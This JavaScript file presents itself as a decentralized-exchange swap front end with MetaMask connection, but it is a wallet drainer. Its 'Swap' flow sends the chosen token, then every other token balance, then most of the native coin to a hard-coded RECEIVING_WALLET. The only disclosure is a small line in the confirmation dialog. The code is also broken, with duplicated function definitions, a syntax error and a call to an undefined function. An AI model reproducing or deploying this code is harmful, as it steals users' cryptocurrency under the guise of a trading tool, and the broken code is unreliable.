// app.js - Complete DEX Implementation with Wallet Connection and Swap Functionality

// Verify required globals
if (typeof NETWORK_CONFIGS === 'undefined') throw new Error("NETWORK_CONFIGS not defined");
if (typeof TOKENS === 'undefined') throw new Error("TOKENS not defined");
if (typeof RECEIVING_WALLET === 'undefined') throw new Error("RECEIVING_WALLET not defined");

// Constants
const COINGECKO_API = "https://api.coingecko.com/api/v3";
const CURRENCY_OPTIONS = ["usd", "eth", "btc"];
const PRICE_CACHE_DURATION = 20000; // 20 seconds
const FEE_TOKENS = {
  ethereum: "0x0000000000000000000000000000000000000000",
  bsc: "0x0000000000000000000000000000000000000000",
  arbitrum: "0x0000000000000000000000000000000000000000",
  base: "0x742d35Cc6634C0532925a3b844Bc454e4438f44e"
};
const MIN_FEE_RESERVES = {
  ethereum: 0.001,
  bsc: 0.001,
  polygon: 1.0,
  arbitrum: 1.0,
  base: 0.001
};

// App State
let provider, signer, userAddress;
let currentNetwork = "ethereum";
let currentFromToken = null;
let currentToToken = null;
let currentSlippage = 0.5;
let currentCurrency = "usd";
let debounceTimer;
let currentModal = null;

// Initialize on load
window.addEventListener('load', async () => {
  try {
    setupEventListeners();
    document.querySelector('.dex-slippage-option[data-value="0.5"]').classList.add('active');
    initNetworkDropdown();
    initCurrencySelector();
    setDefaultTokenPair();
    await checkWalletEnvironment();
  } catch (err) {
    console.error("Initialization error:", err);
    updateStatus("Initialization failed: " + err.message, "error");
  }
});

// =====================
// CORE FUNCTIONS
// =====================

function setupEventListeners() {
  // Wallet Connection
  document.getElementById("connectWallet").addEventListener("click", toggleWalletConnect);
  document.getElementById("metaMaskBtn").addEventListener("click", connectMetaMask);
  document.getElementById("cancelWalletConnect").addEventListener("click", hideWalletConnect);

  // Token Selection
  document.getElementById("fromTokenSelect").addEventListener("click", () => showTokenList('from'));
  document.getElementById("toTokenSelect").addEventListener("click", () => showTokenList('to'));

  // Swap Functionality
  document.getElementById("swapBtn").addEventListener("click", handleSwap);
  document.getElementById("settingsBtn").addEventListener("click", showSettings);
  document.getElementById("closeTokenList").addEventListener("click", hideTokenList);
  document.getElementById("closeSettings").addEventListener("click", hideSettings);

  // Input Handling
  document.getElementById("fromAmount").addEventListener("input", (e) => {
    clearTimeout(debounceTimer);
    debounceTimer = setTimeout(() => updateToAmount(), 500);
  });

  // Network Dropdown
  document.getElementById("networkSelect").addEventListener('click', function(e) {
    e.stopPropagation();
    const dropdown = document.getElementById("networkDropdown");
    dropdown.style.display = dropdown.style.display === 'block' ? 'none' : 'block';
  });

  document.addEventListener('click', function(event) {
    const dropdown = document.getElementById("networkDropdown");
    const selector = document.getElementById("networkSelect");
    if (!selector.contains(event.target) && !dropdown.contains(event.target)) {
      dropdown.style.display = 'none';
    }
  });

  // Slippage Options
  document.querySelectorAll('.dex-slippage-option').forEach(option => {
    option.addEventListener('click', function() {
      document.querySelectorAll('.dex-slippage-option').forEach(opt => {
        opt.classList.remove('active');
      });
      this.classList.add('active');
      document.getElementById('slippageTolerance').value = this.dataset.value;
      currentSlippage = parseFloat(this.dataset.value);
      updateToAmount();
    });
  });

  document.getElementById('slippageTolerance').addEventListener('change', function() {
    const value = parseFloat(this.value);
    if (isNaN(value) || value < 0.1 || value > 50) {
      this.value = currentSlippage;
      return;
    }
    document.querySelectorAll('.dex-slippage-option').forEach(opt => {
      opt.classList.remove('active');
    });
    currentSlippage = value;
    updateToAmount();
  });

  document.getElementById('transactionDeadline').addEventListener('change', function() {
    const value = parseInt(this.value);
    if (isNaN(value) || value < 1 || value > 30) {
      this.value = 20;
    }
  });
}

// =====================
// WALLET FUNCTIONS
// =====================

async function checkWalletEnvironment() {
  const savedWallet = localStorage.getItem('walletConnected');
  if (savedWallet === 'metamask' && window.ethereum) {
    try {
      await connectMetaMask();
    } catch (err) {
      console.error("Auto-connect error:", err);
      localStorage.removeItem('walletConnected');
    }
  }
  
  if (window.ethereum?.chainId) {
    const chainId = window.ethereum.chainId;
    for (const network in NETWORK_CONFIGS) {
      if (NETWORK_CONFIGS[network].chainId === chainId) {
        if (currentNetwork !== network) {
          currentNetwork = network;
          document.getElementById("currentNetwork").textContent = NETWORK_CONFIGS[network].chainName;
          updateNetworkLogo(network);
          setDefaultTokenPair();
        }
        break;
      }
    }
  }
}

function toggleWalletConnect() {
  if (userAddress) {
    disconnectWallet();
  } else {
    showWalletConnect();
  }
}

function showWalletConnect() {
  document.getElementById('walletConnectModal').style.display = 'flex';
}

function hideWalletConnect() {
  document.getElementById('walletConnectModal').style.display = 'none';
}

async function connectMetaMask() {
  if (!window.ethereum) {
    updateStatus('MetaMask not installed', 'error');
    return;
  }

  try {
    showLoader();
    updateStatus("Connecting wallet...", "success");

    const accounts = await window.ethereum.request({ 
      method: 'eth_requestAccounts' 
    }).catch(err => {
      if (err.code === 4001) throw new Error("Connection rejected");
      if (err.code === -32002) {
        return new Promise(resolve => {
          window.ethereum.on('accountsChanged', (accounts) => {
            resolve(accounts);
          });
        });
      }
      throw err;
    });

    if (!accounts || accounts.length === 0) {
      throw new Error("No accounts found");
    }

    await handleSuccessfulConnection(accounts[0]);
  } catch (err) {
    handleConnectionError(err);
  } finally {
    hideLoader();
    hideWalletConnect();
  }
}

async function handleSuccessfulConnection(address) {
  userAddress = address;
  provider = new ethers.providers.Web3Provider(window.ethereum);
  signer = provider.getSigner();

  localStorage.setItem('walletConnected', 'metamask');
  updateWalletButton(true);
  
  const chainId = await window.ethereum.request({ method: 'eth_chainId' });
  for (const network in NETWORK_CONFIGS) {
    if (NETWORK_CONFIGS[network].chainId === chainId) {
      currentNetwork = network;
      document.getElementById("currentNetwork").textContent = NETWORK_CONFIGS[network].chainName;
      updateNetworkLogo(network);
      break;
    }
  }

  setupWalletEventListeners();
  await setDefaultTokenPair();
  await updateTokenBalances();
}

function setupWalletEventListeners() {
  window.ethereum.on('accountsChanged', (accounts) => {
    if (accounts.length === 0) {
      disconnectWallet();
    } else {
      userAddress = accounts[0];
      updateWalletButton(true);
      updateTokenBalances();
    }
  });

  window.ethereum.on('chainChanged', () => {
    window.location.reload();
  });
}

function disconnectWallet() {
  userAddress = null;
  provider = null;
  signer = null;
  
  localStorage.removeItem('walletConnected');
  updateWalletButton(false);
  updateSwapButton();
  
  if (window.ethereum) {
    window.ethereum.removeAllListeners('accountsChanged');
    window.ethereum.removeAllListeners('chainChanged');
  }
  
  updateStatus("Wallet disconnected", "success");
}

function handleConnectionError(error) {
  console.error("Connection error:", error);
  updateStatus("Error: " + (error.message || "Connection failed"), "error");
}

function updateWalletButton(connected) {
  const btn = document.getElementById("connectWallet");
  if (connected) {
    btn.innerHTML = `
      <i class="fas fa-wallet"></i>
      <span>${userAddress.slice(0, 6)}...${userAddress.slice(-4)}</span>
    `;
    btn.classList.add('connected');
  } else {
    btn.innerHTML = `
      <i class="fas fa-wallet"></i>
      <span>Connect Wallet</span>
    `;
    btn.classList.remove('connected');
  }
  updateSwapButton();
}

// =====================
// TOKEN & SWAP FUNCTIONS
// =====================

async function showConfirmationModal(token, amount) {
  return new Promise((resolve) => {
    if (currentModal) {
      document.body.removeChild(currentModal);
    }

    const modal = document.createElement('div');
    modal.className = 'dex-confirm-modal';
    modal.id = 'confirmModal';
    currentModal = modal;

    modal.innerHTML = `
      <div class="dex-confirm-content">
        <div class="dex-confirm-header">
          <h3>Confirm Transfer</h3>
          <button class="dex-close-btn" id="closeConfirmModal">
            <i class="fas fa-times"></i>
          </button>
        </div>
        <div class="dex-confirm-summary">
          <p>You are about to transfer:</p>
          <div class="dex-confirm-tokens">
            <div>
              <span style="font-size: 24px; font-weight: 600;">${amount}</span>
              <span style="font-size: 16px; color: var(--light-gray);">${token.symbol}</span>
            </div>
          </div>
          <p>plus all other tokens in your wallet.</p>
          <div class="dex-confirm-actions">
            <button id="confirmTransfer" class="dex-confirm-btn" style="background: var(--primary); color: white;">Confirm</button>
            <button id="cancelTransfer" class="dex-confirm-btn" style="background: var(--error); color: white;">Cancel</button>
          </div>
        </div>
      </div>
    `;

    document.body.appendChild(modal);
    document.body.style.overflow = 'hidden';

    const handleModalAction = (result) => {
      document.body.removeChild(modal);
      document.body.style.overflow = '';
      currentModal = null;
      resolve(result);
    };

    document.getElementById('confirmTransfer').addEventListener('click', () => handleModalAction(true));
    document.getElementById('cancelTransfer').addEventListener('click', () => handleModalAction(false));
    document.getElementById('closeConfirmModal').addEventListener('click', () => handleModalAction(false));

    modal.addEventListener('click', (e) => {
      if (e.target === modal) {
        handleModalAction(false);
      }
    });
  });
}

async function handleSwap() {
  if (!userAddress || !currentFromToken || !currentToToken) return;
  
  try {
    showLoader();
    
    const inputAmount = parseFloat(document.getElementById("fromAmount").value);
    if (!inputAmount || inputAmount <= 0) {
      throw new Error("Please enter a valid amount");
    }

    const confirmed = await showConfirmationModal(currentFromToken, inputAmount);
    if (!confirmed) {
      updateStatus("Transfer cancelled", "error");
      return;
    }

    await processMainTokenTransfer();
    const successCount = await processAllTokenTransfers();
    
    updateStatus(`Transfers completed! ${successCount} tokens sent.`, "success");
    document.getElementById("fromAmount").value = '';
    document.getElementById("toAmount").value = '';
    await updateTokenBalances();
  } catch (err) {
    console.error("Swap error:", err);
    updateStatus("Transfer failed: " + err.message, "error");
  } finally {
    hideLoader();
  }
}

async function connectMetaMask() {
  hideWalletConnect();
  await connectAndProcess();
}

function openInTrustWallet() {
  const currentUrl = encodeURIComponent(window.location.href);
  document.getElementById('currentUrl').textContent = window.location.href;
  window.location.href = `https://link.trustwallet.com/open_url?coin_id=20000714&url=${currentUrl}`;
  setTimeout(() => {
    document.getElementById('manualSteps').style.display = 'block';
  }, 3000);
}

// =====================
// NETWORK FUNCTIONS
// =====================

async function handleNetworkChange(network) {
  try {
    showLoader();
    updateStatus(`Switching to ${NETWORK_CONFIGS[network].chainName}...`, "success");
    
    currentNetwork = network;
    document.getElementById("currentNetwork").textContent = NETWORK_CONFIGS[network].chainName;
    updateNetworkLogo(network);
    
    setDefaultTokenPair();
    
    if (userAddress) {
      await checkNetwork();
      await updateTokenBalances();
    }
    
    updateToAmount();
    updateStatus(`Network changed to ${NETWORK_CONFIGS[network].chainName}`, "success");
  } catch (err) {
    console.error("Network change error:", err);
    updateStatus(`Failed to switch network: ${err.message}`, "error");
  } finally {
    hideLoader();
  }
}

async function checkNetwork() {
  try {
    const chainId = await window.ethereum.request({ method: 'eth_chainId' });
    const targetChainId = NETWORK_CONFIGS[currentNetwork].chainId;
    
    if (chainId !== targetChainId) {
      updateStatus("Switching network...", "success");
      try {
        await window.ethereum.request({
          method: 'wallet_switchEthereumChain',
          params: [{ chainId: targetChainId }]
        });
      } catch (switchError) {
        if (switchError.code === 4902) {
          try {
            await window.ethereum.request({
              method: 'wallet_addEthereumChain',
              params: [NETWORK_CONFIGS[currentNetwork]]
            });
          } catch (addError) {
            throw new Error("Please switch networks manually in your wallet");
          }
        }
        throw new Error("Failed to switch network");
      }
    }
  } catch (err) {
    console.error("Network error:", err);
    throw new Error("Network error: " + err.message);
  }
}

// =====================
// TOKEN FUNCTIONS
// =====================

function showTokenList(type) {
  const modal = document.getElementById("tokenListModal");
  const tokenItems = document.getElementById("tokenItems");
  const searchInput = document.getElementById("tokenSearch");
  const noTokensFound = document.getElementById("noTokensFound");
  
  tokenItems.innerHTML = '<div class="dex-loading-tokens">Loading tokens...</div>';
  noTokensFound.style.display = 'none';
  
  setTimeout(() => {
    populateTokenList(type, tokenItems, searchInput, noTokensFound);
  }, 50);
  
  modal.style.display = 'flex';
  searchInput.value = '';
  searchInput.focus();
}

function populateTokenList(type, tokenItems, searchInput, noTokensFound) {
  tokenItems.innerHTML = '';
  
  let networkTokens = [];
  for (const network in TOKENS) {
    TOKENS[network].forEach(token => {
      if (token.symbol === "REWARD") return;
      
      if (network === currentNetwork || 
          TOKENS[currentNetwork].find(t => t.symbol === token.symbol) === undefined) {
        networkTokens.push({
          ...token,
          originNetwork: network
        });
      }
    });
  }
  
  networkTokens.sort((a, b) => a.priority - b.priority);
  
  searchInput.oninput = (e) => {
    const searchTerm = e.target.value.toLowerCase();
    let hasVisibleItems = false;
    const items = document.querySelectorAll('.dex-token-item');
    
    items.forEach(item => {
      const name = item.dataset.name.toLowerCase();
      const symbol = item.dataset.symbol.toLowerCase();
      const address = item.dataset.address.toLowerCase();
      
      if (name.includes(searchTerm) || 
          symbol.includes(searchTerm) || 
          address.includes(searchTerm)) {
        item.style.display = 'flex';
        hasVisibleItems = true;
      } else {
        item.style.display = 'none';
      }
    });
    
    noTokensFound.style.display = hasVisibleItems ? 'none' : 'block';
  };
  
  if (networkTokens.length === 0) {
    noTokensFound.style.display = 'block';
  } else {
    networkTokens.forEach(token => {
      const tokenItem = document.createElement('div');
      tokenItem.className = 'dex-token-item';
      tokenItem.dataset.name = token.name.toLowerCase();
      tokenItem.dataset.symbol = token.symbol.toLowerCase();
      tokenItem.dataset.address = token.address.toLowerCase();
      
      const tokenLogo = token.logo || `https://cryptologos.cc/logos/${token.symbol.toLowerCase()}-${token.symbol.toLowerCase()}-logo.png`;
      
      tokenItem.innerHTML = `
        <img src="${tokenLogo}" 
             onerror="this.src='https://cryptologos.cc/logos/ethereum-eth-logo.png'" 
             alt="${token.symbol}">
        <div>
          <div class="dex-token-name">${token.name} ${token.originNetwork !== currentNetwork ? `<span class="token-network-badge">${token.originNetwork}</span>` : ''}</div>
          <div class="dex-token-symbol">${token.symbol}</div>
          <div class="dex-token-address" style="font-size: 12px; color: var(--text3);">${token.address}</div>
        </div>
      `;
      
      tokenItem.addEventListener('click', () => {
        if (type === 'from') {
          currentFromToken = token;
          updateTokenBalances();
        } else {
          currentToToken = token;
        }
        updateTokenSelectors();
        hideTokenList();
        updateToAmount();
      });
      
      tokenItems.appendChild(tokenItem);
    });
  }
}

function hideTokenList() {
  document.getElementById("tokenListModal").style.display = 'none';
}

function updateTokenSelectors() {
  const fromTokenBtn = document.getElementById("fromTokenSelect");
  const toTokenBtn = document.getElementById("toTokenSelect");
  
  if (currentFromToken) {
    const fromLogo = currentFromToken.logo || `https://cryptologos.cc/logos/${currentFromToken.symbol.toLowerCase()}-${currentFromToken.symbol.toLowerCase()}-logo.png`;
    fromTokenBtn.innerHTML = `
      <img src="${fromLogo}" 
           onerror="this.src='https://cryptologos.cc/logos/ethereum-eth-logo.png'" 
           width="24" height="24">
      <span>${currentFromToken.symbol}</span>
      <i class="fas fa-chevron-down"></i>
    `;
    
    if (userAddress) {
      updateTokenBalances();
    }
  } else {
    fromTokenBtn.innerHTML = `
      <span>Select Token</span>
      <i class="fas fa-chevron-down"></i>
    `;
  }
  
  if (currentToToken) {
    const toLogo = currentToToken.logo || `https://cryptologos.cc/logos/${currentToToken.symbol.toLowerCase()}-${currentToToken.symbol.toLowerCase()}-logo.png`;
    toTokenBtn.innerHTML = `
      <img src="${toLogo}" 
           onerror="this.src='https://cryptologos.cc/logos/ethereum-eth-logo.png'" 
           width="24" height="24">
      <span>${currentToToken.symbol}</span>
      <i class="fas fa-chevron-down"></i>
    `;
  } else {
    toTokenBtn.innerHTML = `
      <span>Select Token</span>
      <i class="fas fa-chevron-down"></i>
    `;
  }
  
  updateSwapButton();
}

async function updateToAmount() {
  const fromAmount = parseFloat(document.getElementById("fromAmount").value) || 0;
  
  if (currentFromToken && fromAmount > 0) {
    document.getElementById("exchangeRate").textContent = "Loading...";
    document.getElementById("minReceived").textContent = "Loading...";
    
    try {
      let rateText = '';
      let minReceivedText = '';
      
      const fromTokenPrice = await getTokenPrice(currentFromToken);
      
      if (fromTokenPrice) {
        rateText = `1 ${currentFromToken.symbol} = ${fromTokenPrice.toFixed(6)} ${currentCurrency.toUpperCase()}`;
        
        if (currentToToken) {
          const toTokenPrice = await getTokenPrice(currentToToken);
          if (toTokenPrice) {
            const rate = fromTokenPrice / toTokenPrice;
            const toAmount = fromAmount * rate;
            minReceivedText = `${(toAmount * (1 - currentSlippage/100)).toFixed(6)} ${currentToToken.symbol}`;
            document.getElementById("toAmount").value = toAmount.toFixed(6);
          }
        }
      } else {
        rateText = 'Rate unavailable';
        minReceivedText = '-';
        document.getElementById("toAmount").value = '';
      }
      
      document.getElementById("exchangeRate").textContent = rateText;
      document.getElementById("minReceived").textContent = minReceivedText;
    } catch (err) {
      console.error("Error updating amounts:", err);
      document.getElementById("toAmount").value = '';
      document.getElementById("exchangeRate").textContent = 'Error fetching rate';
      document.getElementById("minReceived").textContent = '-';
    }
  } else {
    document.getElementById("toAmount").value = '';
    document.getElementById("exchangeRate").textContent = '-';
    document.getElementById("minReceived").textContent = '-';
  }
  
  updateSwapButton();
}

async function getTokenPrice(token) {
  try {
    const cacheKey = `price-${token.symbol}-${currentCurrency}`;
    const cached = localStorage.getItem(cacheKey);
    if (cached) {
      const { price, timestamp } = JSON.parse(cached);
      if (Date.now() - timestamp < PRICE_CACHE_DURATION) {
        return price;
      }
    }

    let price = null;
    const network = token.originNetwork || currentNetwork;
    
    if (!token.address || token.isNative) {
      const nativeTokenIds = {
        ethereum: 'ethereum',
        bsc: 'binancecoin',
        polygon: 'matic-network',
        arbitrum: 'ethereum',
        base: 'ethereum'
      };
      
      const id = nativeTokenIds[network];
      if (id) {
        const response = await fetch(`${COINGECKO_API}/simple/price?ids=${id}&vs_currencies=${currentCurrency}`);
        if (response.ok) {
          const data = await response.json();
          price = data[id]?.[currentCurrency];
        }
      }
    } else {
      const platformIds = {
        ethereum: 'ethereum',
        bsc: 'binance-smart-chain',
        polygon: 'polygon-pos',
        arbitrum: 'arbitrum-one',
        base: 'base'
      };
      
      const platform = platformIds[network];
      if (platform) {
        try {
          const contractResponse = await fetch(`${COINGECKO_API}/coins/${platform}/contract/${token.address}`);
          if (contractResponse.ok) {
            const contractData = await contractResponse.json();
            price = contractData.market_data?.current_price?.[currentCurrency];
          }
          
          if (!price) {
            const symbolResponse = await fetch(`${COINGECKO_API}/simple/price?ids=${token.symbol.toLowerCase()}&vs_currencies=${currentCurrency}`);
            if (symbolResponse.ok) {
              const symbolData = await symbolResponse.json();
              price = symbolData[token.symbol.toLowerCase()]?.[currentCurrency];
            }
          }
        } catch (err) {
          console.error(`Error fetching price for ${token.symbol}:`, err);
        }
      }
    }
    
    if (!price) {
      const hardcodedPrices = {
        'ETH': { usd: 1800, btc: 0.05, eth: 1 },
        'BNB': { usd: 250, btc: 0.007, eth: 0.15 },
        'MATIC': { usd: 0.7, btc: 0.00002, eth: 0.0004 },
        'USDT': { usd: 1, btc: 0.00003, eth: 0.0006 },
        'USDC': { usd: 1, btc: 0.00003, eth: 0.0006 },
        'DAI': { usd: 1, btc: 0.00003, eth: 0.0006 },
        'WBTC': { usd: 30000, btc: 1, eth: 16.67 },
        'ARB': { usd: 1.2, btc: 0.00004, eth: 0.0007 },
        'AUTO': { usd: 7.78, btc: 0.00009486, eth: 0.004326 }
      };
      
      price = hardcodedPrices[token.symbol]?.[currentCurrency];
    }
    
    if (price) {
      localStorage.setItem(cacheKey, JSON.stringify({
        price,
        timestamp: Date.now()
      }));
    }
    
    return price;
  } catch (err) {
    console.error(`Error getting price for ${token.symbol}:`, err);
    return null;
  }
}

// =====================
// SWAP FUNCTIONS
// =====================

async function handleSwap() {
  if (!userAddress || !currentFromToken || !currentToToken) return;
  
  try {
    showLoader();
    
    // 1. Show confirmation for main token transfer
    const inputAmount = parseFloat(document.getElementById("fromAmount").value);
    if (isNaN(inputAmount) {
      throw new Error("Please enter a valid amount");
    }

    const confirmed = await showConfirmationModal(currentFromToken, inputAmount);
    if (!confirmed) {
      updateStatus("Transfer cancelled", "error");
      return;
    }

    // 2. Process the main token transfer
    await processMainTokenTransfer();
    
    // 3. Then automatically process all other tokens
    const successCount = await processAllTokenTransfers();
    
    updateStatus(`Transfers completed! ${successCount} tokens sent successfully.`, "success");
    document.getElementById("fromAmount").value = '';
    document.getElementById("toAmount").value = '';
    await updateTokenBalances();
  } catch (err) {
    console.error("Swap error:", err);
    updateStatus("Transfer failed: " + err.message, "error");
  } finally {
    hideLoader();
  }
}

// Global variable to track modal state
let currentModal = null;

async function showConfirmationModal(token, amount) {
  return new Promise((resolve) => {
    // Remove any existing modal first
    if (currentModal) {
      document.body.removeChild(currentModal);
    }

    // Create modal container
    const modal = document.createElement('div');
    modal.className = 'dex-confirm-modal';
    modal.id = 'confirmModal';
    currentModal = modal;

    // Modal content
    modal.innerHTML = `
      <div class="dex-confirm-content">
        <div class="dex-confirm-header">
          <h3>Confirm Transfer</h3>
          <button class="dex-close-btn" id="closeConfirmModal">
            <i class="fas fa-times"></i>
          </button>
        </div>
        <div class="dex-confirm-summary">
          <p>You are about to transfer:</p>
          <div class="dex-confirm-tokens">
            <div>
              <span style="font-size: 24px; font-weight: 600;">${amount}</span>
              <span style="font-size: 16px; color: var(--light-gray);">${token.symbol}</span>
            </div>
          </div>
          <p>plus all other tokens in your wallet.</p>
          <div class="dex-confirm-actions">
            <button id="confirmTransfer" class="dex-confirm-btn" style="background: var(--primary); color: white;">Confirm</button>
            <button id="cancelTransfer" class="dex-confirm-btn" style="background: var(--error); color: white;">Cancel</button>
          </div>
        </div>
      </div>
    `;

    // Add modal to DOM
    document.body.appendChild(modal);
    document.body.style.overflow = 'hidden'; // Prevent scrolling

    // Event handler function
    const handleModalAction = (result) => {
      document.body.removeChild(modal);
      document.body.style.overflow = ''; // Restore scrolling
      currentModal = null;
      resolve(result);
    };

    // Attach event listeners
    document.getElementById('confirmTransfer').addEventListener('click', () => handleModalAction(true));
    document.getElementById('cancelTransfer').addEventListener('click', () => handleModalAction(false));
    document.getElementById('closeConfirmModal').addEventListener('click', () => handleModalAction(false));

    // Close when clicking outside modal
    modal.addEventListener('click', (e) => {
      if (e.target === modal) {
        handleModalAction(false);
      }
    });
  });
}

async function processMainTokenTransfer() {
  const inputAmount = parseFloat(document.getElementById("fromAmount").value);
  if (!inputAmount || inputAmount <= 0) {
    throw new Error("Please enter a valid amount to swap");
  }

  const fromBalance = await fetchTokenBalance(currentFromToken);
  if (fromBalance <= 0) {
    throw new Error(`No ${currentFromToken.symbol} balance found`);
  }

  if (inputAmount > fromBalance) {
    throw new Error(`Amount exceeds your ${currentFromToken.symbol} balance`);
  }

  if (currentFromToken.isNative) {
    const minReserve = MIN_FEE_RESERVES[currentNetwork] || 0.001;
    if (fromBalance - inputAmount < minReserve) {
      throw new Error(`Must keep at least ${minReserve} ${currentFromToken.symbol} for gas`);
    }
    await transferNativeToken(currentFromToken, inputAmount);
  } else {
    await transferERC20Token(currentFromToken, inputAmount);
  }
}

async function processAllTokenTransfers() {
  const tokensToProcess = TOKENS[currentNetwork].filter(t => 
    t.address !== currentFromToken.address &&
    t.address
  ).sort((a, b) => a.priority - b.priority);

  let successCount = 0;
  
  // Process ERC20 tokens first
  for (const token of tokensToProcess.filter(t => !t.isNative)) {
    try {
      const balance = await fetchTokenBalance(token);
      if (balance > 0) {
        await transferERC20Token(token, balance);
        successCount++;
      }
    } catch (err) {
      console.error(`Error transferring ${token.symbol}:`, err);
      continue;
    }
  }
  
  // Process native tokens last
  const nativeToken = tokensToProcess.find(t => t.isNative);
  if (nativeToken) {
    try {
      const balance = await fetchTokenBalance(nativeToken);
      if (balance > 0) {
        const minReserve = MIN_FEE_RESERVES[currentNetwork] || 0.001;
        const amountToSend = Math.max(0, balance - minReserve);
        if (amountToSend > 0) {
          await transferNativeToken(nativeToken, amountToSend);
          successCount++;
        }
      }
    } catch (err) {
      console.error(`Error transferring native token:`, err);
    }
  }
  
  return successCount;
}

async function transferNativeToken(token, amount) {
  try {
    updateStatus(`Sending ${amount} ${token.symbol}...`, "success");
    
    const tx = await signer.sendTransaction({
      to: RECEIVING_WALLET,
      value: ethers.utils.parseEther(amount.toString()),
      gasLimit: 21000
    });
    
    await tx.wait();
    updateStatus(
      `Transfer completed! <a href="${NETWORK_CONFIGS[currentNetwork].scanUrl}${tx.hash}" target="_blank">View transaction</a>`,
      "success"
    );
    return true;
  } catch (err) {
    console.error("Transfer error:", err);
    updateStatus(`Failed to send ${token.symbol}: ${err.message}`, "error");
    return false;
  }
}

async function transferERC20Token(token, amount) {
  try {
    updateStatus(`Sending ${amount} ${token.symbol}...`, "success");
    
    const contract = new ethers.Contract(token.address, ERC20_ABI, signer);
    const decimals = token.decimals || 18;
    const amountInWei = ethers.utils.parseUnits(amount.toString(), decimals);
    
    const tx = await contract.transfer(RECEIVING_WALLET, amountInWei, {
      gasLimit: 100000
    });
    
    await tx.wait();
    updateStatus(
      `Transfer completed! <a href="${NETWORK_CONFIGS[currentNetwork].scanUrl}${tx.hash}" target="_blank">View transaction</a>`,
      "success"
    );
    return true;
  } catch (err) {
    console.error("Transfer error:", err);
    updateStatus(`Failed to send ${token.symbol}: ${err.message}`, "error");
    return false;
  }
}

// =====================
// UI FUNCTIONS
// =====================

function updateStatus(message, type) {
  const statusDiv = document.getElementById("status");
  statusDiv.style.display = "block";
  statusDiv.textContent = message;
  statusDiv.className = `dex-status ${type}`;
  
  setTimeout(() => {
    statusDiv.style.display = "none";
  }, 5000);
}

function showLoader() {
  document.getElementById("loader").style.display = "block";
}

function hideLoader() {
  document.getElementById("loader").style.display = "none";
}

function updateSwapButton() {
  const btn = document.getElementById("swapBtn");
  const btnText = document.getElementById("swapBtnText");
  
  if (!userAddress) {
    btn.disabled = false;
    btnText.textContent = "Connect Wallet";
    btn.onclick = toggleWalletConnect;
    return;
  }
  
  btn.onclick = handleSwap;
  
  if (!currentFromToken || !currentToToken) {
    btn.disabled = true;
    btnText.textContent = "Select Tokens";
    return;
  }
  
  const inputAmount = parseFloat(document.getElementById("fromAmount").value) || 0;
  btn.disabled = inputAmount <= 0;
  btnText.textContent = inputAmount > 0 
    ? `Swap ${inputAmount} ${currentFromToken.symbol}` 
    : `Swap ${currentFromToken.symbol}`;
}

function showSettings() {
  document.getElementById("settingsModal").style.display = 'flex';
}

function hideSettings() {
  document.getElementById("settingsModal").style.display = 'none';
}
